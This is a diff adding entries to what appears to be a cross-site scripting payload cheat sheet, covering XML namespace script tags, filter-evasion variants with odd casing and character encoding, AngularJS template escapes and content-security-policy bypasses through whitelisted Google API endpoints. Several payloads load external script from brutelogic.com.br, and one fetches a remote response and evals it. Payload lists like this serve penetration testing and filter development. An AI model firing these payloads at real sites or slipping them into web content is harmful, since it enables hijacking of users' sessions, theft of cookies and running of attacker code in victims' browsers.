@@ -14,6 +14,10 @@ XSS in XML
 
 ```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```
 
+```<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>```
+
+```<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>```
+
  Where :// is required after protocol
 
 ```javascript://%250aalert(1)```
@@ -47,3 +51,54 @@ GET Hidden Fields data
 ```<svg/x=">"/onload=confirm()//```
 
 ```<sCript x>(((confirm)))``</scRipt x>```
+
+```<svg </onload ="1> (_=prompt,_(1)) "">```
+
+```<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>```
+
+```<w="/x="y>"/ondblclick=`<`[confir\u006d``]>XXS```
+
+```<script/x>alert(1)</script/x>```
+
+```"><!--<iMg sRc=--><img src=x oNERror=(prompt)`1` x>"```
+
+```"><deTails oNToggle=confi\u0072m(1)>"```
+
+Get response back to server
+
+```<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:8080");a.send();</script>```
+
+```<A/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x>XSS```
+
+```data:,alert(1)```
+
+```\'-alert(1)//```
+
+```'}alert(1);{'```
+
+```'}alert(1)%0A{'```
+
+```\'}alert(1);{//```
+
+CSP bypass if http://ajax.googleapis.com is whitelisted
+
+```<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>```
+
+```<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>```
+
+```<script src=data:,alert(1)>```
+
+
+Angular JS XSS
+
+```{{constructor.constructor('alert(1)')()}}```
+
+```<x ng-app>{{constructor.constructor('alert(1)')()}} ```
+
+Upper Case
+
+```<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>```
+
+ ```<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>```
+ 
+```data:text/html,<svg onload=alert(1)>```
